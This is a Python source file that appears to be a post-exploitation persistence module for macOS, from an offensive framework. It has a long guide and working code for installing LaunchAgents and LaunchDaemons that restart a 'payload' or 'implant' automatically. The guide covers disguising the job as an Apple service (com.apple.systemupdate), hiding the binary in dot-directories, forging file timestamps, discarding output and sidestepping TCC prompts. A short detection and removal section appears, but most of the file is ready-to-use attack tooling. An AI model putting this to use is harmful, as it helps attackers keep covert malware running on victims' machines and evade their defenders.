"""STUB — macOS LaunchAgent / LaunchDaemon persistence.

Installs a property-list (plist) file that launchd uses to start the payload
automatically.  LaunchAgents run as the current user; LaunchDaemons run as
root at boot before any user logs in.

──────────────────────────────────────────────────────────────────────────────
IMPLEMENTATION GUIDE
──────────────────────────────────────────────────────────────────────────────

LAUNCHD OVERVIEW
----------------
launchd is macOS's init system (PID 1).  It replaces cron and rc.  The two
relevant job types:

  LaunchAgent   — per-user, starts when the user logs in
    Load path:  ~/Library/LaunchAgents/        (user-installed)
                /Library/LaunchAgents/          (admin-installed, all users)
  LaunchDaemon  — system-wide, starts at boot as root
    Load path:  /Library/LaunchDaemons/         (no SIP restriction)
                /System/Library/LaunchDaemons/  (SIP-protected, read-only)

  From macOS Ventura+: LaunchAgent loading requires notarisation for some
  cases but user-space ~/Library/LaunchAgents/ remains unrestricted.


METHOD 1: User LaunchAgent (no root required)
---------------------------------------------
  import os, plistlib, subprocess

  def install_launch_agent(
      label: str,          # e.g. "com.apple.systemupdate"
      program_args: list,  # e.g. ["/bin/bash", "/path/to/payload"]
      keep_alive: bool = True,
      run_at_load: bool = True,
      start_interval: int = 0,   # seconds; 0 = use KeepAlive instead
  ) -> str:
      agent_dir = os.path.expanduser("~/Library/LaunchAgents/")
      os.makedirs(agent_dir, exist_ok=True)
      plist_path = os.path.join(agent_dir, f"{label}.plist")

      plist = {
          "Label":           label,
          "ProgramArguments": program_args,
          "RunAtLoad":       run_at_load,
      }
      if keep_alive:
          plist["KeepAlive"] = True        # restart if killed
      if start_interval > 0:
          plist["StartInterval"] = start_interval   # alternative to KeepAlive
      plist["StandardOutPath"] = "/dev/null"
      plist["StandardErrorPath"] = "/dev/null"

      with open(plist_path, "wb") as f:
          plistlib.dump(plist, f)
      os.chmod(plist_path, 0o644)          # must not be group/world writable

      # Load immediately (no reboot needed):
      subprocess.run(["launchctl", "load", plist_path], capture_output=True)
      # macOS 11+ equivalent (bootstrap):
      # subprocess.run(["launchctl", "bootstrap", f"gui/{os.getuid()}", plist_path])

      return plist_path


USEFUL PLIST KEYS
-----------------
  RunAtLoad         bool    — start immediately when plist is loaded
  KeepAlive         bool    — restart the job if it exits for any reason
  StartInterval     int     — run every N seconds (alternative to KeepAlive)
  StartCalendarInterval  dict  — cron-like schedule:
                                 {"Hour": 9, "Minute": 0}  → every day at 09:00
                                 {"Weekday": 1, "Hour": 8} → every Monday at 08:00
  WorkingDirectory  str     — set the working directory before launching
  EnvironmentVariables  dict — inject env vars into the job's environment
  ThrottleInterval  int     — minimum seconds between restarts (default 10)
  UserName          str     — LaunchDaemon only: run as this user
  GroupName         str     — LaunchDaemon only: run as this group
  HardResourceLimits  dict  — CPU/memory limits (may hinder implant)
  Disabled          bool    — if True, don't load on next boot (use False)


METHOD 2: System LaunchDaemon (requires root, survives all user sessions)
-------------------------------------------------------------------------
  plist_path = f"/Library/LaunchDaemons/{label}.plist"
  # Same plist structure, but place in /Library/LaunchDaemons/
  # Load with root:
  subprocess.run(["launchctl", "load", plist_path])
  # macOS 11+:
  subprocess.run(["launchctl", "bootstrap", "system", plist_path])


METHOD 3: Login Items (visible in System Settings, easier to detect)
--------------------------------------------------------------------
  # AppleScript approach:
  subprocess.run([
      "osascript", "-e",
      'tell application "System Events" to make login item at end '
      'with properties {name:"Update", path:"/path/to/app", hidden:true}'
  ])

  # Programmatic via SMAppService (macOS 13+):
  # Requires sandboxing / entitlements — not practical for red team use.


METHOD 4: Hiding the payload
----------------------------
  # Blend the label with legitimate Apple names:
  #   com.apple.mdmclient.daemon    → com.apple.mdmclient2.daemon
  #   com.apple.dt.Xcode            → com.apple.dt.XcodeHelper2
  # Place the binary in a plausible path:
  #   ~/.local/lib/com.apple.update/update   (hidden by leading dot in parent)
  #   ~/Library/Application Support/.hidden/update
  # Set the binary's modification time to match system files:
  #   import os; os.utime(binary_path, (system_mtime, system_mtime))


CHECKING EXISTING LAUNCH AGENTS (detection awareness)
------------------------------------------------------
  launchctl list | grep -v "^-"                  # running jobs
  ls ~/Library/LaunchAgents/                     # user agents
  ls /Library/LaunchAgents/                      # admin agents (all users)
  ls /Library/LaunchDaemons/                     # system daemons


REMOVAL
-------
  launchctl unload ~/Library/LaunchAgents/{label}.plist
  # macOS 11+:
  launchctl bootout gui/{uid} ~/Library/LaunchAgents/{label}.plist
  rm ~/Library/LaunchAgents/{label}.plist


SIP (SYSTEM INTEGRITY PROTECTION) NOTES
-----------------------------------------
  SIP protects /System/Library/ and other OS paths.  User-space paths
  (~/Library/LaunchAgents/, /Library/LaunchDaemons/) are NOT SIP-protected.
  Check SIP status: csrutil status
  Even with SIP disabled, Gatekeeper and TCC (Transparency Consent Control)
  may prompt for permissions when the payload runs for the first time.
  To avoid TCC prompts, place the binary in a path that already has FDA
  (Full Disk Access) or limit operations to user-accessible paths.


ARGS EXPECTED BY THIS MODULE
-----------------------------
  {
    "label":         "com.apple.systemupdate",
    "program_args":  ["/bin/bash", "/path/to/payload"],
    "keep_alive":    true,
    "run_at_load":   true,
    "start_interval": 0,           # 0 = KeepAlive; N>0 = run every N seconds
    "daemon":        false,        # true = LaunchDaemon (requires root)
  }
"""

import os
import platform
import plistlib
import subprocess
from pathlib import Path

from post.base import ModuleResult, PostModule
from post.loader import register

_AGENTS_DIR = Path.home() / "Library" / "LaunchAgents"


def _plist_path(label: str) -> Path:
    return _AGENTS_DIR / f"{label}.plist"


def _install(label: str, program: str | list, run_at_load: bool = True,
             keep_alive: bool = False, interval: int = 0) -> dict:
    """Write a LaunchAgent plist and load it."""
    _AGENTS_DIR.mkdir(parents=True, exist_ok=True)
    plist_path = _plist_path(label)

    plist: dict = {
        "Label":            label,
        "RunAtLoad":        run_at_load,
        "KeepAlive":        keep_alive,
    }

    if isinstance(program, list):
        plist["ProgramArguments"] = program
    else:
        plist["ProgramArguments"] = ["/bin/sh", "-c", program]

    if interval > 0:
        plist["StartInterval"] = interval

    plist["StandardOutPath"] = str(Path.home() / "Library" / "Logs" / f"{label}.log")
    plist["StandardErrorPath"] = str(Path.home() / "Library" / "Logs" / f"{label}.err")

    with open(plist_path, "wb") as f:
        plistlib.dump(plist, f)

    # Load using launchctl bootstrap (macOS 10.11+)
    uid = os.getuid()
    r = subprocess.run(
        ["launchctl", "bootstrap", f"gui/{uid}", str(plist_path)],
        capture_output=True, text=True,
    )
    loaded = r.returncode == 0
    if not loaded:
        # Fallback for older macOS
        r2 = subprocess.run(
            ["launchctl", "load", "-w", str(plist_path)],
            capture_output=True, text=True,
        )
        loaded = r2.returncode == 0

    return {"plist": str(plist_path), "loaded": loaded, "output": (r.stdout + r.stderr).strip()}


def _remove(label: str) -> dict:
    """Unload and delete a LaunchAgent plist."""
    plist_path = _plist_path(label)
    uid = os.getuid()

    # bootout (preferred) then fallback to unload
    r = subprocess.run(
        ["launchctl", "bootout", f"gui/{uid}", str(plist_path)],
        capture_output=True, text=True,
    )
    if r.returncode != 0:
        subprocess.run(["launchctl", "remove", label], capture_output=True)

    try:
        plist_path.unlink()
        file_removed = True
    except FileNotFoundError:
        file_removed = False

    return {"label": label, "file_removed": file_removed}


def _list_agents() -> list[dict]:
    """List all LaunchAgents in ~/Library/LaunchAgents/."""
    if not _AGENTS_DIR.exists():
        return []
    agents = []
    for p in _AGENTS_DIR.glob("*.plist"):
        try:
            with open(p, "rb") as f:
                data = plistlib.load(f)
            agents.append({
                "label":       data.get("Label", p.stem),
                "path":        str(p),
                "run_at_load": data.get("RunAtLoad", False),
                "keep_alive":  data.get("KeepAlive", False),
                "program":     data.get("ProgramArguments", data.get("Program", "")),
            })
        except Exception:
            agents.append({"path": str(p), "error": "unreadable"})

    # Check which are currently running
    r = subprocess.run(["launchctl", "list"], capture_output=True, text=True)
    running_labels = {line.split()[2] for line in r.stdout.splitlines()[1:]
                      if len(line.split()) >= 3} if r.returncode == 0 else set()
    for a in agents:
        a["running"] = a.get("label", "") in running_labels

    return agents


# ── Module ─────────────────────────────────────────────────────────────────────

@register
class LaunchAgentPersistModule(PostModule):
    NAME        = "persist/launchagent"
    DESCRIPTION = "macOS LaunchAgent persistence: install/remove/list plists in ~/Library/LaunchAgents/"
    PLATFORM    = ["darwin"]
    IMPLEMENTED = True

    def run(self, args: dict | None = None) -> ModuleResult:
        """
        Args:
            action       (str): "install" | "remove" | "list"

            For install:
              label       (str): Reverse-DNS label, e.g. "com.apple.system-update"
              program     (str|list): Command string or argv list
              run_at_load (bool): Run immediately when loaded (default True)
              keep_alive  (bool): Restart if it exits (default False)
              interval    (int): StartInterval in seconds (0 = disabled)

            For remove:
              label (str): Label of the agent to remove
        """
        if platform.system() != "Darwin":
            return ModuleResult(ok=False, output="",
                                error="LaunchAgents are macOS-only (use cron on Linux)")

        args = args or {}
        action = args.get("action", "list")

        if action == "list":
            agents = _list_agents()
            lines = [f"LaunchAgents in ~/Library/LaunchAgents/: {len(agents)}", ""]
            for a in agents:
                status = "running" if a.get("running") else "stopped"
                lines.append(f"  [{status}] {a.get('label', a.get('path', '?'))}")
                prog = a.get("program", "")
                if prog:
                    prog_str = " ".join(prog) if isinstance(prog, list) else prog
                    lines.append(f"             {prog_str[:80]}")
            return ModuleResult(ok=True, output="\n".join(lines), data={"agents": agents})

        if action == "install":
            label   = args.get("label", "")
            program = args.get("program", "")
            if not label or not program:
                return ModuleResult(ok=False, output="",
                                    error="Required: label, program")
            result = _install(
                label=label,
                program=program,
                run_at_load=args.get("run_at_load", True),
                keep_alive=args.get("keep_alive", False),
                interval=int(args.get("interval", 0)),
            )
            lines = [
                f"LaunchAgent installed: {label}",
                f"  Plist:  {result['plist']}",
                f"  Loaded: {result['loaded']}",
            ]
            if result.get("output"):
                lines.append(f"  Output: {result['output']}")
            return ModuleResult(ok=result["loaded"], output="\n".join(lines), data=result)

        if action == "remove":
            label = args.get("label", "")
            if not label:
                return ModuleResult(ok=False, output="", error="Required: label")
            result = _remove(label)
            return ModuleResult(ok=True,
                                output=f"LaunchAgent '{label}' removed (file: {result['file_removed']})",
                                data=result)

        return ModuleResult(ok=False, output="",
                            error=f"Unknown action '{action}'. Use: install|remove|list")
